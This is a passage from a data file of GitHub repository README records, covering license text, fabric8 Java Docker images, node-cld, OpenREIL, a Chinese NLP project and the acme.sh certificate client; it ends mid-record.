DIRECT,\n  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n  ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n  The source code of Botan C++ crypto library can be found in\n  JuliaStudio\/src\/libs\/3rdparty\n```\n\n##### ClassView and ImageViewer plugins\n\n```\n  Copyright (C) 2012 Digia Plc and\/or its subsidiary(-ies).\n\n  All rights reserved.\n  Copyright (c) 2010 Denis Mingulov.\n\n  Contact: http:\/\/www.qt-project.org\/\n\n  This file is part of Julia Studio.\n\n  You may use this file under the terms of the BSD license as follows:\n\n  \"Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are\n  met:\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n    * Redistributions in binary form must reproduce the above copyright\n      notice, this list of conditions and the following disclaimer in\n      the documentation and\/or other materials provided with the\n      distribution.\n    * Neither the name of Digia Plc and its Subsidiary(-ies) nor\n      the names of its contributors may be used to endorse or promote\n      products derived from this software without specific prior written\n      permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\"\n```\n\n\n"},{"repo":"\/fabric8io-images\/java","language":"Shell","readme_contents":"## Fabric8 Java Base Images\n\nThis is a repository for Java Docker base images used in various fabric8 projects.\n\nThe Docker build files for these images are generated by\n[fish-pepper](https:\/\/github.com\/fabric8io-images\/fish-pepper), a sophisticated\ntemplate system for generation Docker builds. `fish-pepper` allows\nthe composition of various building block so that parametrized Docker\nbuilds are easy possible.\n\nIn order to regenerate all Dockerfiles from the provided templates you\nneed only to install `fish-pepper` via npm (assuming that you have\n[node.js](https:\/\/nodejs.org\/) installed)\n\n```\nnpm -g install fish-pepper\nfish-pepper\n```\n\nThe Java base images come in different flavors:\n\n* Based on [CentOS 7](https:\/\/www.centos.org\/) or\n  [Alpine Linux](https:\/\/www.alpinelinux.org\/) (experimental)\n* [OpenJDK 7](http:\/\/openjdk.java.net\/projects\/jdk7\/) or\n  [OpenJDK 8](http:\/\/openjdk.java.net\/projects\/jdk8\/) or\n  [OpenJDK 11](http:\/\/openjdk.java.net\/projects\/jdk\/11\/)\n* As JDK (Java Developer Toolkit) or as JRE (Java Runtime Environment)\n\nAll images add the following features:\n\n* [agent-bond](https:\/\/github.com\/fabric8io\/agent-bond) is included\n  which combines [Jolokia](http:\/\/www.jolokia.org) and\n  [jmx_exporter](https:\/\/github.com\/prometheus\/jmx_exporter)\n* A startup script [run-java.sh](https:\/\/github.com\/fabric8io\/run-java-sh) is\n  included which transparently starts Java application provided as FAT-jar or\n  traditionally with a bunch of jar dependencies.\n\nHow to use these images and what environment variables can be used are\ndescribed in the associated [README](images\/centos\/openjdk8\/jdk\/README.md) files.\n"},{"repo":"\/dachev\/node-cld","language":"C++","readme_contents":"# node-cld\n[![*NIX Build Status](https:\/\/secure.travis-ci.org\/dachev\/node-cld.png)](https:\/\/travis-ci.org\/dachev\/node-cld)\n[![Windows Build Status](https:\/\/ci.appveyor.com\/api\/projects\/status\/github\/dachev\/node-cld?svg=true&retina=true)](https:\/\/ci.appveyor.com\/project\/dachev\/node-cld)\n[![Dependencies](https:\/\/david-dm.org\/dachev\/node-cld.png)](https:\/\/david-dm.org\/dachev\/node-cld)\n[![NPM version](https:\/\/badge.fury.io\/js\/cld.svg)](http:\/\/badge.fury.io\/js\/cld)\n\nLanguage detection for Javascript. Based on the CLD2 (Compact Language Detector) library from Google.\n\nHighly optimized for space and speed. Runs about 10x faster than other libraries. Detects over 160 languages. Full test coverage. Runs on Linux, OS X, and Windows.\n\n## Installation\n\n```bash\n$ npm install cld\n```\n\nLinux users, make sure you have g++ >= 4.8. If this is not an option, you should be able to install node-cld 2.4.4 even with an older g++ build.\n\n## Examples\n### Simple\n```js\nrequire('cld').detect('This is a language recognition example', function(err, result) {\n  console.log(result);\n});\n```\n\n### Advanced\n```js\nvar text    = '\u0422\u043e\u0432\u0430 \u0435 \u043f\u0440\u0438\u043c\u0435\u0440 \u0437\u0430 \u0440\u0430\u0437\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0435 \u043d\u0430 \u0411\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438 \u0435\u0437\u0438\u043a';\nvar options = {\n  isHTML       : false,\n  languageHint : 'BULGARIAN',\n  encodingHint : 'ISO_8859_5',\n  tldHint      : 'bg',\n  httpHint     : 'bg'\n};\n\nrequire('cld').detect(text, options, function(err, result) {\n  console.log(result);\n});\n```\n\n\n## Options\n\n#### isHTML\n\nSet to true if the string contains HTML tags\n\n#### languageHint\n\nPass a LANGUAGES key or value as a hint\n\n#### encodingHint\n\nPass an ENCODINGS value as a hint\n\n#### tldHint\n\nPass top level domain as a hint\n\n#### httpHint\n\nPass an HTTP \"Content-Encoding\" value as a hint\n\n## Warning\nOnce the module has been installed, the underlying C sources will remain in the ```deps\/cld``` folder and continue to occupy considerable space. This is because they will be required if you ever need to run `npm rebuild`. If you are under severe constraints you can delete this folder and reclam >100M\n\n## Copyright\nCopyright 2011-2015, Blagovest Dachev.\n\n## License\nApache 2\n"},{"repo":"\/Cr4sh\/openreil","language":"C","readme_contents":"\nOpenREIL is open source library that implements translator and tools for REIL (Reverse Engineering Intermediate Language).\n\nPlease refer to docs\/README.html for more detailed information.\n\n\nDeveloped by Dmytro Oleksiuk (aka Cr4sh), cr4sh0@gmail.com\n"},{"repo":"\/taozhijiang\/chinese_nlp","language":"C++","readme_contents":"#\u4e00\u4e9b\u6c49\u8bed\u8a00\u5904\u7406\u7684\u4e1c\u897f   \n\n## segment \u6c49\u8bed\u8a00\u5206\u8bcd   \n- \u539f\u7406\uff1aHHM   \n- \u4f9d\u8d56\uff1anumpy scipy hhmlearn    \n- \u53c2\u8003\uff1a   \n  - [Itenyh\u7248-\u7528HMM\u505a\u4e2d\u6587\u5206\u8bcd\u56db\uff1aA Pure-HMM \u5206\u8bcd\u5668](http:\/\/www.52nlp.cn\/itenyh%E7%89%88-%E7%94%A8hmm%E5%81%9A%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%9B%9B%EF%BC%9Aa-pure-hmm-%E5%88%86%E8%AF%8D%E5%99%A8)   \n  - [\u81ea\u5df1\u5199\u4e2d\u6587\u5206\u8bcd\u4e4b\uff08\u4e8c\uff09_\u7528HMM\u6a21\u578b\u5b9e\u73b0\u5206\u8bcd](http:\/\/sbp810050504.blog.51cto.com\/2799422\/1251640)   \n- TODO\uff1a   \n  - \u6ca1\u6709\u9488\u5bf9\u82f1\u6587\u5355\u8bcd\u3001\u6807\u70b9\u7b49\u5904\u7406\uff0c\u4e5f\u6ca1\u6709\u7a97\u53e3\u5316\u64cd\u4f5c    \n\n\t\n## \u4e3b\u9898\u5206\u7c7b   \n- \u539f\u7406\uff1aLDA & Labled LDA   \n- \u4f9d\u8d56\uff1agensim   \n- \u53c2\u8003:\n  - http:\/\/blog.itpub.net\/16582684\/viewspace-1253901\/\n  - https:\/\/radimrehurek.com\/gensim\/models\/ldamodel.html\n  - https:\/\/shuyo.wordpress.com\/\n- TODO:\n  - \u611f\u89c9\u6548\u679c\u4e0d\u662f\u5f88\u597d\u554a\n\n## LSI\/LDA\u4fe1\u606f\u68c0\u7d22\n- \u539f\u7406\uff1aSVD\u5947\u5f02\u503c\u5206\u89e3\n- \u4f9d\u8d56\uff1agensim\n- TODO:\n - \u539f\u7406\u6bd4\u8f83\u7b80\u5355\uff0c\u53ea\u6709SVD\uff0c\u68c0\u7d22\u7ed3\u679c\u8fd8\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u9700\u8981\u8c03\u6574topic\u7684\u53c2\u6570\uff0c\u5de5\u7a0b\u4e0a\u4ee5200-500\u4e3a\u4f73\u3002\n\n## \u60c5\u611f\u5206\u6790\n- \u539f\u7406: \u57fa\u4e8e\u7edf\u8ba1\u7684\u65b9\u5f0f   \n- \u4f9d\u8d56\uff1antlk sklearn   \n- \u8bed\u6599\uff1a\u67d0\u4e1c\u7684\u5546\u54c1\u8bc4\u8bba\uff0c\u597d\u8bc4-\u5dee\u8bc4   \n- \u53c2\u8003\uff1a   \n  - [Python \u6587\u672c\u6316\u6398\uff1a\u4f7f\u7528scikit-learn \u673a\u5668\u5b66\u4e60\u5305\u8fdb\u884c\u6587\u672c\u5206\u7c7b ](http:\/\/rzcoding.blog.163.com\/)\n\n## \u8d1d\u53f6\u65af\u5206\u7c7b   \n- \u7528C\/C++\u91cd\u65b0\u5b9e\u73b0\u540e\uff0c\u53d1\u73b0\u5185\u5b58\u5360\u7528\u7387\u548c\u8fd0\u7b97\u901f\u5ea6\u6bd4Python\u8981\u5757\u5f88\u591a\u3002   \n- \u901a\u8fc7Sogou\u7684\u8bad\u7ec3\u8bed\u6599\u53d1\u73b0\uff0c10\u4e2a\u5206\u7c7b\u4e0b\uff0c10000\u7279\u5f81\u8bcd\u7684\u5206\u7c7b\u51c6\u786e\u7387\u572875%\u5de6\u53f3\uff0c\u800c\u5728\u4eac\u4e1c\u6293\u53d6\u7684\u597d\u8bc4\/\u5dee\u8bc4\u8bed\u6599\u8bad\u7ec3\u540e\uff0c\u6d4b\u8bd5\u5206\u7c7b\u7cbe\u5ea6\u8fbe\u523091%\u5de6\u53f3\u3002   \n\n## \u6700\u5927\u71b5\u5206\u7c7b\u5668   \n- \u539f\u7406\uff1a\u81ea\u884cGoogle   \n- \u53c2\u8003\uff1a   \n  - http:\/\/www.fuqingchuan.com\/2015\/03\/776.html   \n  - http:\/\/www.nltk.org\/_modules\/nltk\/classify\/maxent.html   \n  - http:\/\/www.umiacs.umd.edu\/~hal\/megam\/index.html   \n- NOTE\uff1a   \n  - \u57fa\u672c\u662f\u6309\u7167nltk\u7684GIS\u7b97\u6cd5\u7ffb\u8bd1\u8fc7\u6765\u7684\uff0c\u6ca1\u6709\u5b9e\u73b0IIS\uff0c\u6240\u4ee5\u8bad\u7ec3\u7684\u901f\u5ea6\u975e\u5e38\u7684\u6162\u3002\n- MEGAM   \n  - \u6dfb\u52a0\u4e86MEGAM\u90e8\u5206\uff0c\u5e95\u5c42\u8c03\u7528\u7684megam\u662f\u57fa\u4e8eL-BFGS\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u901f\u5ea6\u8fd8\u662f\u633a\u5feb\u7684\uff0c\u6709\u5b9e\u7528\u4ef7\u503c\u4e86\u3002\u53e6\u5916\u5e95\u5c42\u8c03\u7528\u7684megam\u662f\n\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0832\u4f4d\uff09\u7684\uff0c\u6240\u4ee5\u4f60\u7684\u7cfb\u7edf\u8981\u652f\u630132\u4f4d\u7684\u8fd0\u884c\u5e93\uff08dnf install glibc.i686\uff09\n\n## \u57fa\u4e8eCRF\u7684\uff08NER\u547d\u540d\u5b9e\u4f53\u8bc6\u522b\uff09   \n- \u53c2\u8003\uff1a[CRFSuite Manual](http:\/\/www.chokkan.org\/software\/crfsuite\/manual.html)   \n- TODO\uff1a   \n   - \u4eba\u5bb6\u5df2\u7ecf\u7406\u8bba\u5206\u6790\u4e86CRF\u7684\u6548\u679c\u4f1a\u6bd4\u8d1d\u53f6\u65af\u548c\u9a6c\u5c14\u79d1\u592b\u6a21\u578b\u8981\u597d\uff0c\u800c\u4e14CRF\u5f53\u524d\u6700\u4e3b\u8981\u7684\u5e94\u7528\u5c31\u662fNLP\u7684\u5206\u8bcd\u3001\u5e8f\u5217\u6807\u6ce8\u548c\u547d\u540d\u5b9e\u4f53\u8bc6\u522b\u4e86\u3002\u4e2a\u4eba\u6d4b\u8bd5\u89c9\u5f97\uff0c\u7b97\u6cd5\u7684\u6536\u655b\u7684\u901f\u5ea6\u5f88\u6162\uff0c\u6240\u4ee5\u6a21\u578b\u53ea\u8fed\u4ee3\u8bad\u7ec3\u4e86\u4e94\u767e\u6b21\u3002\u6b64\u5916\uff0c\u73b0\u5728\u7684\u7b97\u6cd5\u90fd\u5341\u5206\u7684\u6210\u719f\u4e86\uff0c\u800c\u771f\u6b63\u7684\u58c1\u5792\u5728\u4e8e\u6570\u636e\uff0c\u56fd\u5185\u7684\u5f00\u53d1\u6bd4\u8f83\u7684\u4fdd\u5b88\uff0c\u516c\u5f00\u7684\u6807\u6ce8\u8bed\u6599\u5c11\u4e4b\u53c8\u5c11\u3002\u4eba\u6c11\u65e5\u62a5\u7684\u6807\u6ce8\u8bed\u6599\u516c\u5f00\u7684\u90e8\u5206\u4e0d\u591a\uff0c\u800c\u4e14\u6587\u5b57\u6bd4\u8f83\u7684\u4e66\u9762\u548c\u5b88\u65e7\uff0c\u6548\u679c\u4e00\u822c\u3002   \n   - \u4f8b\u5b50   \n   > \u8fd8\u5f97\u4ece20\u5e74\u524d\u4e2dB-ORG \u5171I-ORG \u53ec\u5f00\u5341\u4e8c\u5927\u524d\u5915\u8bf4\u8d77\u30021982\u5e746\u670827\u65e5\u81f329\u65e5\u7684\u4e2dB-ORG \u5171I-ORG \u5341\u4e00\u5c4a\u516d\u4e2d\u5168\u4f1a\u671f\u95f4\uff0c\u5370\u53d1\u4e86\u9648B-PER \u4e91I-PER \u64b0\u5199\u7684\u300a\u63d0\u62d4\u57f9\u517b\u4e2d\u9752\u5e74\u5e72\u90e8\u662f\u5f53\u52a1\u4e4b\u6025\u300b\u4e00\u6587\u548c\u4ed6\u4e3b\u6301\u8d77\u8349\u7684\u300a\u5173\u4e8e\u8001\u5e72\u90e8\u79bb\u4f11\u9000\u4f11\u95ee\u9898\u5ea7\u8c08\u4f1a\u7eaa\u8981\u300b\u3002\u4f1a\u540e\uff0c\u90e8\u5206\u4e0e\u4f1a\u4eba\u5458\u7559\u4e0b\u6765\u53c2\u52a0\u5404\u7701\u5e02\u81eaB-ORG \u6cbbI-ORG \u533aI-ORG \u515aI-ORG \u59d4I-ORG \u4e66\u8bb0\u5ea7\u8c08\u4f1a\u30027\u67082\u65e5\uff0c\u9648B-PER \u4e91I-PER \u5728\u5ea7\u8c08\u4f1a\u4e0a\u8bb2\u8bdd\uff0c\u5f3a\u8c03\u5e72\u90e8\u961f\u4f0d\u9752\u9ec4\u4e0d\u63a5\u7684\u5ba2\u89c2\u5b58\u5728\uff0c\u4e0d\u65e0\u62c5\u5fe7\u5730\u8bf4\uff1a\u63d0\u4e94\u5341\u5c81\u5de6\u53f3\u7684\u4eba\u53ef\u80fd\u4e89\u8bba\u5c11\u4e9b\uff0c\u63d040\u5c81\u5de6\u53f3\u7684\u4eba\uff0c\u4e89\u8bba\u3001\u6000\u7591\u4f1a\u5f88\u591a\u3002\u63d040\u5c81\u4ee5\u4e0b\u7684\u4eba\uff0c\u6000\u7591\u3001\u4e89\u8bba\u4f1a\u66f4\u591a\u3002\u65e2\u7136\u5982\u6b64\uff0c\u4e3a\u4ec0\u4e48\u201c\u7eaa\u8981\u201d\u8fd8\u662f\u201c\u7279\u522b\u5199\u63d0\u56db\u5341\u5c81\u4ee5\u4e0b\u7684\u4eba\u8fd9\u4e00\u53e5\uff1f\u201d\u4ed6\u81ea\u95ee\u81ea\u7b54\uff1a\u4e00\u662f\u5e74\u5bcc\u529b\u5f3a\u3002\u4e8c\u662f\u6709\u610f\u8bc6\u5730\u57f9\u517b\u3002\u7ecf\u8fc73\u5e74\u30015\u5e74\u300110\u5e74\uff0c\u6709\u610f\u8bc6\u5730\u57f9\u517b\uff0c\u9009\u51fa\u597d\u7684\u4eba\u3002\u4e09\u662f40\u5c81\u4ee5\u4e0b\u7684\u4eba\u4e2d\u95f4\u6709\u4eba\u624d\u3002\u56db\u662f\u53ea\u670940\u5c81\u4ee5\u4e0b\u7684\u4eba\uff0c\u624d\u4e86\u89e3\u201c\u6587\u9769\u201d\u521d\u671f\u9752\u5e74\u4eba\u5f53\u65f6\u7684\u60f3\u6cd5\u548c\u8868\n\n## \u57fa\u4e8e\u540c\u4e49\u8bcd\u8bcd\u6797\u7684\u6d88\u6b67\u5b9e\u73b0\uff1a   \n- \u539f\u7406\uff1a\u57fa\u4e8e\u540c\u4e49\u8bcd\u8bcd\u6797\u7684\u8bed\u6599\u5e93\u53cd\u67e5\uff0c\u8bbe\u5b9a\u5404\u4e2a\u610f\u9879\u7684\u8bc4\u5206\u3002   \n- \u7ed3\u679c\uff1a\u4e0d\u77e5\u9053\u662f\u8fd9\u79cd\u65b9\u5f0f\u7684\u539f\u56e0\uff0c\u8fd8\u662f\u8bc4\u5206\u51fd\u6570\u4f18\u5316\u7684\u4e0d\u5408\u7406\uff0c\u5728\u6807\u6ce8\u7684\u8bed\u6599\u4e0b\uff0c\u51c6\u786e\u5ea6\u5927\u698244%\u5de6\u53f3\u3002   \n\n# \u6df1\u5ea6\u5b66\u4e60\u90e8\u5206   \n## \u4f9d\u8d56\u548c\u4f7f\u7528\u7684\u6df1\u5ea6\u5b66\u4e60\u5e93   \n  - theano (CUDA optional)   \n  - keras   \n  - genism   \n\n\n## \u6df1\u5ea6\u5b66\u4e60\u5206\u8bcd\n- \u53c2\u8003\uff1ahttp:\/\/xccds1977.blogspot.com\/2015\/11\/blog-post_25.html   \n- \u8bed\u6599\u5e93\uff1a[\u5317\u5927\u548c\u5fae\u8f6f\u7814\u7a76\u9662\u7684\u5206\u8bcd\u8bed\u6599](http:\/\/www.sighan.org\/bakeoff2005\/)   \n- TODO:   \n  - \u5bf9\u4e8e\u82f1\u6587\u5355\u8bcd\u548c\u6570\u5b57\u7684\u5904\u7406   \n  - \u52a0\u5927\u795e\u7ecf\u7f51\u7edc\u7684\u795e\u7ecf\u8282\u70b9\u6570\u76ee   \n- \u5206\u8bcd\u6548\u679c(LSTM 100-100 4\u7c7b\u6807\u6ce8 15\u6b21\u8fed\u4ee3):   \n> \u4e2d\u4e1c \u548c\u5e73 \u7684 \u5efa\u8bbe\u8005 \u3001 \u4e2d\u4e1c \u53d1\u5c55 \u7684 \u63a8\u52a8 \u8005 \u3001 \u4e2d\u4e1c \u5de5\u4e1a\u5316 \u7684 \u52a9 \u63a8 \u8005 \u3001 \u4e2d\u4e1c \u7a33\u5b9a \u7684 \u652f\u6301\u8005 \u3001 \u4e2d\u4e1c \u6c11\u5fc3 \u4ea4\u878d \u7684 \u5408\u4f5c \u4f19\u4f34 \u2014\u2014 \u4e60\u8fd1 \u5e73 \u4e3b\u5e2d \u5728 \u6f14\u8bb2 \u4e2d \u4e3a \u4e2d\u56fd-\u4e2d\u4e1c\u5173\u7cfb \u53d1\u5c55 \u6307\u660e \u7684 \u65b9\u5411 \uff0c \u5207\u5408 \u5730\u533a \u5b9e\u9645 \u60c5\u51b5 \uff0c \u7167\u987e \u5730\u533a \u56fd\u5bb6 \u5173\u5207 \uff0c \u4e3a \u6446 \u5728 \u56fd\u9645 \u793e\u4f1a \u9762\u524d \u7684 \u201c \u4e2d\u4e1c \u4e4b \u95ee \u201d \u7ed9 \u51fa \u4e86 \u4e2d\u56fd \u7684 \u7b54\u6848 \u3002 \n> 2014\u5e746 \u6708 \uff0c \u4e60\u8fd1 \u5e73\u5728 \u4e2d \u963f \u5408\u4f5c \u8bba\u575b \u5317\u4eac \u90e8\u957f \u7ea7 \u4f1a\u8bae \u4e0a \u63d0\u51fa \uff0c \u4e2d \u963f \u5171\u5efa \u201c \u4e00\u5e26 \u4e00\u8def \u201d \uff0c \u6784\u5efa \u4ee5 \u80fd\u6e90 \u5408\u4f5c \u4e3a \u4e3b\u8f74 \uff0c \u4ee5 \u57fa\u7840 \u8bbe\u65bd \u5efa\u8bbe \u3001 \u8d38\u6613 \u548c \u6295\u8d44 \u4fbf\u5229 \u5316 \u4e3a \u4e24\u7ffc \uff0c \u4ee5 \u6838\u80fd \u3001 \u822a\u5929 \u536b\u661f \u3001 \u65b0 \u80fd\u6e90 \u4e09 \u5927 \u9ad8 \u65b0 \u9886\u57df \u4e3a \u65b0 \u7684 \u7a81\u7834\u53e3 \u7684 \u201c 1 + 2 + 3 \u201d \u5408\u4f5c \u683c\u5c40 \u3002 \n> \u5728 \u6b64\u6b21 \u843d\u9a6c \u7684 16 \u4eba \u91cc\u9762 \uff0c \u7ea7\u522b \u6700\u9ad8 \u7684 \u662f \u8fde \u57ce\u53bf\u59d4 \u539f \u4e66\u8bb0 \u6c5f\u56fd\u6cb3 \u3002 \u5c65\u5386 \u663e\u793a \uff0c \u6c5f \u56fd\u6cb3 196 3\u5e74 \u51fa\u751f \uff0c \u9f99\u5ca9\u5e02 \u6c38\u5b9a\u53bf \u9ad8\u5934\u4e61 \u4eba \u3002 \u88ab \u8c03\u67e5 \u65f6 \uff0c \u4ed6 \u5df2 \u5728 \u798f\u5efa\u7701 \u80fd\u6e90\u96c6\u56e2\u6709\u9650\u8d23\u4efb \u516c\u53f8 \u8463\u4e8b \u3001 \u7eaa\u59d4 \u4e66\u8bb0 \u7684 \u4f4d\u5b50 \u4e0a \u5e72 \u4e86 \u4e24\u5e74 \u3002 \n> \u673a\u667a\u5802 \u662f \u65b0 \u6d6a \u624b\u673a \u63a8\u51fa \u7684 \u65b0 \u680f\u76ee \uff0c \u98ce\u8da3 \u5e7d\u9ed8 \u662f \u6211\u4eec \u7684 \u57fa\u8c03 \uff0c \u76f4\u767d \u7b80\u5355 \u5730 \u666e\u53ca \u624b\u673a \u6280\u672f \u77e5\u8bc6 \u662f \u6211\u4eec \u7684 \u76ee\u7684 \u3002 \u6211\u4eec \u8c08 \u624b\u673a \uff0c \u4e5f \u8c08 \u624b \u673a \u5708 \u7684 \u6709 \u8da3\u4e8b \uff0c \u6bcf\u6708 \u5b9a\u671f \u66f4\u65b0 \uff0c \u641e \u673a \u7231\u597d\u8005 \u4eec \u5343\u4e07 \u4e0d \u80fd \u9519\u8fc7 \u3002 \n\n\n## RNN-LSTM\u81ea\u52a8\u6587\u672c\u751f\u6210   \n- \u53c2\u8003\uff1a   \n  - [RNN Character Model - 2 Layer](https:\/\/github.com\/ebenolson\/pydata2015\/blob\/master\/4%20-%20Recurrent%20Networks\/RNN%20Character%20Model%20-%202%20Layer.ipynb)   \n  - [char-rnn](https:\/\/github.com\/karpathy\/char-rnn)   \n  - [lstm_text_generation](https:\/\/github.com\/fchollet\/keras\/blob\/master\/examples\/lstm_text_generation.py)   \n"},{"repo":"\/Neilpang\/acme.sh","language":"Shell","readme_contents":"# An ACME Shell script: acme.sh [![Build Status](https:\/\/travis-ci.org\/Neilpang\/acme.sh.svg?branch=master)](https:\/\/travis-ci.org\/Neilpang\/acme.sh)\n\n<a href=\"https:\/\/opencollective.com\/acmesh\" alt=\"Financial Contributors on Open Collective\"><img src=\"https:\/\/opencollective.com\/acmesh\/all\/badge.svg?label=financial+contributors\" \/><\/a> [![Join the chat at https:\/\/gitter.im\/acme-sh\/Lobby](https:\/\/badges.gitter.im\/acme-sh\/Lobby.svg)](https:\/\/gitter.im\/acme-sh\/Lobby?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n- An ACME protocol client written purely in Shell (Unix shell) language.\n- Full ACME protocol implementation.\n- Support ACME v1 and ACME v2\n- Support ACME v2 wildcard certs\n- Simple, powerful and very easy to use. You only need 3 minutes to learn it.\n- Bash, dash and sh compatible.\n- Simplest shell script for Let's Encrypt free certificate client.\n- Purely written in Shell with no dependencies on python or the official Let's Encrypt client.\n- Just one script to issue, renew and install your certificates automatically.\n- DOES NOT require `root\/sudoer` access.\n- Docker friendly\n- IPv6 support\n- Cron job notifications for renewal or error etc.\n\nIt's probably the `easiest & smartest` shell script to automatically issue & renew the free certificates from Let's Encrypt.\n\nWiki: https:\/\/github.com\/Neilpang\/acme.sh\/wiki\n\nFor Docker Fans: [acme.sh :two_hearts: Docker ](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/Run-acme.sh-in-docker)\n\nTwitter: [@neilpangxa](https:\/\/twitter.com\/neilpangxa)\n\n\n# [\u4e2d\u6587\u8bf4\u660e](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/%E8%AF%B4%E6%98%8E)\n\n# Who:\n- [FreeBSD.org](https:\/\/blog.crashed.org\/letsencrypt-in-freebsd-org\/)\n- [ruby-china.org](https:\/\/ruby-china.org\/topics\/31983)\n- [Proxmox](https:\/\/pve.proxmox.com\/wiki\/HTTPS_Certificate_Configuration_(Version_4.x_and_newer))\n- [pfsense](https:\/\/github.com\/pfsense\/FreeBSD-ports\/pull\/89)\n- [webfaction](https:\/\/community.webfaction.com\/questions\/19988\/using-letsencrypt)\n- [Loadbalancer.org](https:\/\/www.loadbalancer.org\/blog\/loadbalancer-org-with-lets-encrypt-quick-and-dirty)\n- [discourse.org](https:\/\/meta.discourse.org\/t\/setting-up-lets-encrypt\/40709)\n- [Centminmod](https:\/\/centminmod.com\/letsencrypt-acmetool-https.html)\n- [splynx](https:\/\/forum.splynx.com\/t\/free-ssl-cert-for-splynx-lets-encrypt\/297)\n- [archlinux](https:\/\/www.archlinux.org\/packages\/community\/any\/acme.sh)\n- [opnsense.org](https:\/\/github.com\/opnsense\/plugins\/tree\/master\/security\/acme-client\/src\/opnsense\/scripts\/OPNsense\/AcmeClient)\n- [CentOS Web Panel](http:\/\/centos-webpanel.com\/)\n- [lnmp.org](https:\/\/lnmp.org\/)\n- [more...](https:\/\/github.com\/Neilpang\/acme.sh\/wiki\/Blogs-and-tutorials)\n\n# Tested OS\n\n| NO | Status| Platform|\n|----|-------|---------|\n|1|[![](https:\/\/neilpang.github.io\/acmetest\/status\/ubuntu-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)| Ubuntu\n|2|[![](https:\/\/neilpang.github.io\/acmetest\/status\/debian-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)| Debian\n|3|[![](https:\/\/neilpang.github.io\/acmetest\/status\/centos-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|CentOS\n|4|[![](https:\/\/neilpang.github.io\/acmetest\/status\/windows-cygwin.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Windows (cygwin with curl, openssl and crontab included)\n|5|[![](https:\/\/neilpang.github.io\/acmetest\/status\/freebsd.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|FreeBSD\n|6|[![](https:\/\/neilpang.github.io\/acmetest\/status\/pfsense.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|pfsense\n|7|[![](https:\/\/neilpang.github.io\/acmetest\/status\/opensuse-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|openSUSE\n|8|[![](https:\/\/neilpang.github.io\/acmetest\/status\/alpine-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Alpine Linux (with curl)\n|9|[![](https:\/\/neilpang.github.io\/acmetest\/status\/base-archlinux.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Archlinux\n|10|[![](https:\/\/neilpang.github.io\/acmetest\/status\/fedora-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|fedora\n|11|[![](https:\/\/neilpang.github.io\/acmetest\/status\/kalilinux-kali-linux-docker.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Kali Linux\n|12|[![](https:\/\/neilpang.github.io\/acmetest\/status\/oraclelinux-latest.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Oracle Linux\n|13|[![](https:\/\/neilpang.github.io\/acmetest\/status\/proxmox.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)| Proxmox https:\/\/pve.proxmox.com\/wiki\/HTTPSCertificateConfiguration#Let.27s_Encrypt_using_acme.sh\n|14|-----| Cloud Linux  https:\/\/github.com\/Neilpang\/le\/issues\/111\n|15|[![](https:\/\/neilpang.github.io\/acmetest\/status\/openbsd.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|OpenBSD\n|16|[![](https:\/\/neilpang.github.io\/acmetest\/status\/mageia.svg)](https:\/\/github.com\/Neilpang\/letest#here-are-the-latest-status)|Mageia\n|17|-----| OpenWRT: Tested and working. See [wiki 